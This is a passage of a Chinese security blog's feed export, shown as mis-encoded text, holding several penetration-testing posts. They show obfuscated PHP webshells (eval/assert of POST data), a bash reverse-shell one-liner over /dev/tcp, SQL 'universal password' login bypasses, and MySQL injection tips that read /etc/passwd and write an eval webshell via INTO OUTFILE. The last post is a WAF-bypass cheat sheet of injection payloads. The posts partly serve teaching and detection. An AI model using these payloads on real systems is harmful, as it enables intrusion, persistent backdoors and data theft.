<p>å’±ä»¬éƒ½çŸ¥é“ä¼ ç»Ÿçš„webshellæŸ¥æ€åŸºæœ¬ä¸Šéƒ½æ˜¯åŸºäºæ­£åˆ™åº“(è¿™é‡Œä¸å¾—ä¸åæ§½ä¸‹å…¬å¸çš„é‚£ä¸ªwebshellæŸ¥æ€å·¥å…·ï¼ŒçœŸå‡ æŠŠåƒåœ¾çš„ä¸è¡Œ)ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è‡ªå·±å°±èƒ½æ–­å®šæŸä¸ªPHPè„šæœ¬æ˜¯æ˜¯webshellå‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬åœ¨è‡ªå·±çš„å¤§è„‘ä¸­è™šæ‹Ÿè°ƒè¯•äº†è¿™ä¸ªPHPè„šæœ¬ï¼ŒçŸ¥é“å®ƒæ˜¯å¹²å˜›çš„äº†ï¼Œæ‰€ä»¥è¿™å°±æ˜¯å’Œå·¥å…·çš„åŒºåˆ«ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—å¼€å‘çš„webshellæŸ¥æ€å°±æ˜¯<strong>åŸºäºè™šæ‹Ÿæ‰§è¡Œå’Œæ­£åˆ™</strong>çš„webshellæŸ¥æ€ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬é‚£ä¸Šé¢çš„ç¬¬ä¸€ä¸ªåˆ—å­ï¼š<br>å¦‚æœæˆ‘ä»¬<code>echo $zk,$ef,$dva,$zvm</code>åˆ™ç»“æœä¸ºï¼š<code>str_replace,base64_decode,create_function,create_function(@eval($_POST[&#39;wen&#39;]))</code>è¿™æ ·åœ¨åŸºäºæ­£åˆ™åŒ¹é…ä¹‹åæ˜¯ä¸æ˜¯å°±å¾ˆæ˜æ˜¾äº†ã€‚</p>
<p>å†æ¥çœ‹å‡ ä¸ªä¾‹å­ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;</div></pre></td></tr></table></figure>
<p>æŒ‰ç…§è¿™ä¸ªæ€è·¯æ˜¯ä¸æ˜¯å¾ˆå®¹æ˜“æ£€æµ‹äº†ã€‚<br>å†æ¥çœ‹ä¸€ä¸ªï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;</div><div class="line">$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;</div><div class="line">$___=$$__;</div><div class="line">$_($___[_]); // assert($_POST[_]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥ç°åœ¨è¦åšçš„å°±æ˜¯æ‰¾å‡ºè„šæœ¬ä¸­æ‰€æœ‰çš„å˜é‡åŠåŒ¿åå‡½æ•°å³å¯ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> CTF </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å…³äº'ä¸‡èƒ½å¯†ç 'çš„æ€è€ƒ]]></title>
      <url>/2017/04/25/%E5%85%B3%E4%BA%8E%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E6%80%9D%E8%80%83/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨æ€»ç»“çš„æ—¶å€™ï¼Œå…³äºSQLä¸‡èƒ½å¯†ç æ–¹é¢çš„ä¸€äº›æ€è€ƒã€‚<br><a id="more"></a><br>SQLä¸‡èƒ½å¯†ç ï¼Œæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œæ¯”å¦‚åƒç±»ä¼¼çš„<code>admin&#39; or &#39;1&#39;=&#39;1&#39;--</code>è¿™æ ·çš„ä»£ç ï¼Œå°±æ˜¯è®©SQLçš„è¡¨è¾¾å¼è¿”å›trueã€‚</p>
<p>ä»è€Œè¾¾åˆ°é€»è¾‘æ­£ç¡®ã€‚</p>
<p>æˆ‘ä»¬å¸¸ç”¨çš„æ³¨é‡Šç¬¦æœ‰ï¼š<br><code>%00,%80-%99</code><br><code>--</code><br><code>-- +</code><br><code>#</code>ç­‰<br>å¦‚æœè¿‡æ»¤äº†<code>or</code>,<code>--</code>,<code>#</code>ç­‰ç‰¹æ®Šå­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬çš„å¸¸ç”¨çš„ä¸‡èƒ½å¯†ç å°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œæ ¹æ®ä¹‹å‰åš<code>å‘½ä»¤æ‰§è¡Œ</code>ç»•è¿‡çš„ç»éªŒï¼Œä½¿ç”¨payloadï¼š<strong><code>&#39;||&#39;</code></strong></p>
<p>å’Œä¸‡èƒ½å¯†é’¥ä¸€æ ·ï¼Œå…ˆé—­åˆå‰é¢çš„è¯­å¥ï¼Œåé¢çš„<code>&#39;</code>ä¸åŸè¯­å¥é—­åˆå¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çŸ¥é“å­—ç¬¦ä¸²è‚¯å®šæ˜¯<code>é0</code>çš„ï¼Œç„¶åå†<code>||</code>æˆ–è¿ç®—ç¬¦è¿ç®—åï¼Œå¾—åˆ°çš„æ°¸è¿œæ˜¯trueã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> ä¸‡èƒ½å¯†ç  </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¸—é€æµ‹è¯•ä¹‹åå¼¹shellå‘½ä»¤åˆ†æ]]></title>
      <url>/2017/04/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>æˆ‘ä»¬åœ¨å¯¹linuxä¸»æœºè¿›è¡Œæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œç»å¸¸å›ç”¨åˆ°åå¼¹shell,ä¹‹å‰ä¹Ÿæ²¡å¥½å¥½å»ç ”ç©¶ã€ç†è§£å…·ä½“éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå°±åªçŸ¥é“ä¼šç”¨â€¦(so lowâ€¦-.-)<br><a id="more"></a><br>æœ€åŸºæœ¬çš„åå¼¹shellçš„ä»£ç å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</p>
</blockquote>
<p>å’±ä»¬ä¸€æ­¥ä¸€æ­¥æ¥åˆ†æï¼š</p>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><strong><code>bash -i</code></strong></p>
<p>è¿™ä¸ªå¤§å®¶éƒ½çŸ¥é“å°±æ˜¯æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„bash</p>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><strong><code>/dev/tcp</code></strong></p>
<p>è¿™ä¸ªæ˜¯linuxä¸­ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡ï¼Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå»ºç«‹äº†ä¸€ä¸ªsocketè¿æ¥ï¼Œå¯¹è¿™ä¸ªæ–‡ä»¶çš„è¯»å†™å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚linuxä¸­è¿˜æœ‰å’Œå®ƒä¸€æ ·çš„æ–‡ä»¶<code>/dev/udp</code>ã€‚</p>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><strong><code>/192.168.1.1/8080</code></strong></p>
<p>è¿™ä¸ªæ˜¯è¡¨ç¤ºè¿œç¨‹ä¸»æœºåŠç›‘å¬çš„ç«¯å£ã€‚</p>
<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p><strong><code>0&gt;&amp;1</code></strong></p>
<p>é¦–å…ˆç§‘æ™®ä¸‹linux shellä¸‹å¸¸ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼š</p>
<ol>
<li>æ ‡å‡†è¾“å…¥(stdin): ä»£ç ä¸ºâ€™0â€™,ä½¿ç”¨ &lt; æˆ– &lt;&lt;</li>
<li>æ ‡å‡†è¾“å‡º(stdout): ä»£ç ä¸ºâ€™1â€™,ä½¿ç”¨ &gt; æˆ– &gt;&gt;</li>
<li>æ ‡å‡†é”™è¯¯è¾“å‡º(stderr): ä»£ç ä¸ºâ€™2â€™,ä½¿ç”¨ 2&gt; æˆ– 2&gt;&gt;</li>
</ol>
<p>ç»è¿‡æŸ¥æ‰¾å‘ç°ï¼š<br><code>&gt;&amp;</code>å’Œ<code>&amp;&gt;</code>çš„ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œå³ï¼š</p>
<p><code>0&gt;&amp;1</code>å’Œ<code>0&lt;&amp;1</code>æ˜¯ä¸€ä¸ªæ„æ€ï¼Œéƒ½æ˜¯å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚</p>
<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>OVER!<br>å¥½å¥‡å¿ƒçœŸçš„å¾ˆæœ‰ç”¨å•Š! )_(</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQLå†™shellçš„ä¸€äº›tips]]></title>
      <url>/2017/04/01/MySQL%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>é€šè¿‡æ³¨å…¥å†™shellï¼Œé¦–å…ˆéœ€è¦æ‰¾åˆ°ç½‘ç«™çš„ç»å¯¹è·¯å¾„ã€‚<br><a id="more"></a></p>
<h1 id="ä¸€ã€æ‰¾è·¯å¾„"><a href="#ä¸€ã€æ‰¾è·¯å¾„" class="headerlink" title="ä¸€ã€æ‰¾è·¯å¾„"></a>ä¸€ã€æ‰¾è·¯å¾„</h1><h2 id="1-æŠ¥é”™"><a href="#1-æŠ¥é”™" class="headerlink" title="1.æŠ¥é”™"></a>1.æŠ¥é”™</h2><p><strong>tipsï¼š</strong><br>æœ‰æ—¶å€™<code>information_schema.tables</code>ä¸èƒ½ç”¨æ—¶ï¼Œåœ¨MySQL 5.6åŠä»¥ä¸Šç‰ˆæœ¬ä¸­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&amp;Submit=Submit%23</div><div class="line">?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()%23&amp;Submit=Submit%23</div></pre></td></tr></table></figure></p>
<h2 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2.phpinfo"></a>2.phpinfo</h2><h2 id="3-load-file"><a href="#3-load-file" class="headerlink" title="3.load_file"></a>3.load_file</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(&apos;/etc/apache2/sites-available/default&apos;);</div></pre></td></tr></table></figure>
<p><strong>tipsï¼š</strong><br>æœ‰æ—¶å€™è¿‡æ»¤äº†æ•æ„Ÿè·¯å¾„å¯ä»¥è¯•è¯•è¿™æ ·ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(&apos;/etc/sb/../passwd&apos;);</div></pre></td></tr></table></figure></p>
<h2 id="4-æ•°ç»„"><a href="#4-æ•°ç»„" class="headerlink" title="4.æ•°ç»„"></a>4.æ•°ç»„</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user[]=1&amp;passwd[]=1</div></pre></td></tr></table></figure>
<h2 id="5-é€šè¿‡mysqlå‡½æ•°-æŸ¥æ‰¾mysqlå®‰è£…ç›®å½•"><a href="#5-é€šè¿‡mysqlå‡½æ•°-æŸ¥æ‰¾mysqlå®‰è£…ç›®å½•" class="headerlink" title="5.é€šè¿‡mysqlå‡½æ•° æŸ¥æ‰¾mysqlå®‰è£…ç›®å½•"></a>5.é€šè¿‡mysqlå‡½æ•° æŸ¥æ‰¾mysqlå®‰è£…ç›®å½•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;datadir&apos;;</div></pre></td></tr></table></figure>
<h1 id="äºŒã€å†™shell"><a href="#äºŒã€å†™shell" class="headerlink" title="äºŒã€å†™shell"></a>äºŒã€å†™shell</h1><h2 id="1-è·å–mysql-userå’Œæ–‡ä»¶æƒé™"><a href="#1-è·å–mysql-userå’Œæ–‡ä»¶æƒé™" class="headerlink" title="1.è·å–mysql.userå’Œæ–‡ä»¶æƒé™"></a>1.è·å–<code>mysql.user</code>å’Œæ–‡ä»¶æƒé™</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select group_concat(user,0x3a,file_priv) from mysql.user;</div><div class="line">å‡ºç°Yï¼Œè¿™å°±ä»£è¡¨ä½ æœ‰æ–‡ä»¶æƒé™ï¼ŒNå°±æ˜¯æ²¡æœ‰</div></pre></td></tr></table></figure>
<h2 id="2-å†™shell"><a href="#2-å†™shell" class="headerlink" title="2.å†™shell"></a>2.å†™shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\Web\errors.php&apos;</div><div class="line">å¦‚æœä¸æˆåŠŸï¼Œå¯èƒ½è½¬ä¹‰äº†ã€‚</div><div class="line">select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\\Web\\errors.php&apos;</div></pre></td></tr></table></figure>
<p>æœ€å¥½è¿˜æ˜¯æŠŠå†…å®¹ç¼–ç ä¸‹ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> webshell </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLæ³¨å…¥-ç»•è¿‡]]></title>
      <url>/2017/03/21/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>æ•´ç†ä¸‹å…³äºSQLæ³¨å…¥ç»•è¿‡çš„ä¸€äº›å§¿åŠ¿ã€‚æ¬¢è¿å¤§ç‰›è¡¥å…… !^â€”^!<br><a id="more"></a></p>
<h1 id="0x01-ç»•è¿‡wafæ€è·¯"><a href="#0x01-ç»•è¿‡wafæ€è·¯" class="headerlink" title="0x01 ç»•è¿‡wafæ€è·¯"></a>0x01 ç»•è¿‡wafæ€è·¯</h1><p>ä»ç¬¬ä¸€æ­¥èµ·ï¼Œä¸€ç‚¹ä¸€ç‚¹å»åˆ†æï¼Œç„¶åç»•è¿‡ã€‚</p>
<ol>
<li><p>è¿‡æ»¤ and,or</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or)/i&apos;, $id)</div><div class="line">Filtered injection: 1 or 1 = 1      1 and 1 = 1</div><div class="line">Bypassed injection: 1 || 1 = 1      1 &amp;&amp; 1 = 1</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union)/i&apos;, $id)</div><div class="line">Filtered injection: union select user, password from users</div><div class="line">Bypassed injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos;</div><div class="line">Bypassed injection: 1 || (select user from users limit 1) = &apos;admin&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select user from users limit 1) = &apos;admin&apos;</div><div class="line">Bypassed injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit, group by</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</div><div class="line">Bypassed injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit, group by, select</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</div><div class="line">Bypassed injection: 1 || 1 = 1 into outfile &apos;result.txt&apos;</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = &apos;a&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</div><div class="line">Bypassed injection: 1 || user_id is not null</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = 0x61</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = unhex(61)</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜, hex</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || substr(user,1,1) = unhex(61)</div><div class="line">Bypassed injection: 1 || substr(user,1,1) = lower(conv(11,10,36))</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜, hex, substr</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || substr(user,1,1) = lower(conv(11,10,36))</div><div class="line">Bypassed injection: 1 || lpad(user,7,1)</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜, hex, substr, ç©ºæ ¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id)</div><div class="line">Filtered injection: 1 || lpad(user,7,1)</div><div class="line">ypassed injection: 1%0b||%0blpad(user,7,1)</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x02-æ­£åˆ™ç»•è¿‡"><a href="#0x02-æ­£åˆ™ç»•è¿‡" class="headerlink" title="0x02 æ­£åˆ™ç»•è¿‡"></a>0x02 æ­£åˆ™ç»•è¿‡</h1><p>æ ¹æ®æ­£åˆ™çš„çš„æ¨¡ç³ŠåŒ¹é…ç‰¹æ€§ç»•è¿‡ï¼Œæ¯”å¦‚è¿‡æ»¤äº†â€™=â€™<br>filtered injection:     1 or 1 = 1<br>Bypassed injection:     1 or 1,1 or â€˜1â€™,1 or char(97)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">eg:</div><div class="line">filtered injection:     1 union select 1, table_name from information_schema.tables where table_name = &apos;users&apos;</div><div class="line">Bypassed injection:     1 union select 1, table_name from information_schema.tables where table_name between &apos;a&apos; and &apos;z&apos;</div><div class="line">Bypassed injection:     1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)</div><div class="line">Bypassed injection:     1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a</div><div class="line">Bypassed Injection:     1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273</div></pre></td></tr></table></figure></p>
<h1 id="0x03-é€šç”¨ç»•è¿‡"><a href="#0x03-é€šç”¨ç»•è¿‡" class="headerlink" title="0x03 é€šç”¨ç»•è¿‡"></a>0x03 é€šç”¨ç»•è¿‡</h1><h2 id="1-æ³¨é‡Šç¬¦"><a href="#1-æ³¨é‡Šç¬¦" class="headerlink" title="1.æ³¨é‡Šç¬¦"></a>1.æ³¨é‡Šç¬¦</h2><blockquote>
<p>?id=1+un/<strong>/ion+se/</strong>/lect+1,2,3â€“</p>
</blockquote>
<h2 id="2-å¤§å°å†™"><a href="#2-å¤§å°å†™" class="headerlink" title="2.å¤§å°å†™"></a>2.å¤§å°å†™</h2><blockquote>
<p>?id=1+UnIoN/<strong>/SeLecT/</strong>/1,2,3â€“</p>
</blockquote>
<h2 id="3-å…³é”®å­—æ›¿æ¢"><a href="#3-å…³é”®å­—æ›¿æ¢" class="headerlink" title="3.å…³é”®å­—æ›¿æ¢"></a>3.å…³é”®å­—æ›¿æ¢</h2><p>æœ‰äº›wafç­‰ä½¿ç”¨preg_replaceæ›¿æ¢äº†SQLå…³é”®å­—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?id=1+UNunionION+SEselectLECT+1,2,3--</div><div class="line">?id=1+uni%0bon+se%0blect+1,2,3--</div></pre></td></tr></table></figure></p>
<p>æœ‰æ—¶å€™æ³¨é‡Šç¬¦â€™/**/â€˜å¯èƒ½è¢«è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨%0bç»•è¿‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/id/1/**/||/**/lpad(first_name,7,1).html</div><div class="line">Bypassed : http://localhost/id/1%0b||%0blpad(first_name,7,1).html</div></pre></td></tr></table></figure></p>
<h2 id="4-ç¼–ç "><a href="#4-ç¼–ç " class="headerlink" title="4.ç¼–ç "></a>4.ç¼–ç </h2><p>ä¸€ä¸ªç»å…¸çš„è„šæœ¬ï¼šNukesentinel.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// Check for UNION attack</div><div class="line">      // Copyright 2004(c) Raven PHP Scripts</div><div class="line">      $blocker_row = $blocker_array[1];</div><div class="line">      if($blocker_row[&apos;activate&apos;] &gt; 0) &#123;</div><div class="line">       if (stristr($nsnst_const[&apos;query_string&apos;],&apos;+union+&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string&apos;],&apos;%20union%20&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string&apos;],&apos;*/union/*&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string&apos;],&apos; union &apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;+union+&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;%20union%20&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;*/union/*&apos;) OR \</div><div class="line">      stristr($nsnst_const[&apos;query_string_base64&apos;],&apos; union &apos;)) &#123;  // block_ip($blocker_row);</div><div class="line">         die(&quot;BLOCK IP 1 &quot; );</div><div class="line">        &#125;</div><div class="line">      &#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/php/?/**/union/**/select</div><div class="line">Bypassed : http://localhost/php/?/%2A%2A/union/%2A%2A/select</div><div class="line">Bypassed : http://localhost/php/?%2f**%2funion%2f**%2fselect</div></pre></td></tr></table></figure>
<h2 id="5-ç¼“å†²åŒºæº¢å‡º"><a href="#5-ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="5.ç¼“å†²åŒºæº¢å‡º"></a>5.ç¼“å†²åŒºæº¢å‡º</h2><blockquote>
<p><a href="http://localhost/news.php?id=1+and+(select" target="_blank" rel="external">http://localhost/news.php?id=1+and+(select</a> 1)=(select 0xA*1000)+union+select+1,2,version(),database(),user(),6,7,8,9,10â€“</p>
</blockquote>
<h2 id="6-å†…è”æ³¨é‡Š-mysql"><a href="#6-å†…è”æ³¨é‡Š-mysql" class="headerlink" title="6.å†…è”æ³¨é‡Š(mysql)"></a>6.å†…è”æ³¨é‡Š(mysql)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--</div><div class="line">http://localhost/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--</div></pre></td></tr></table></figure>
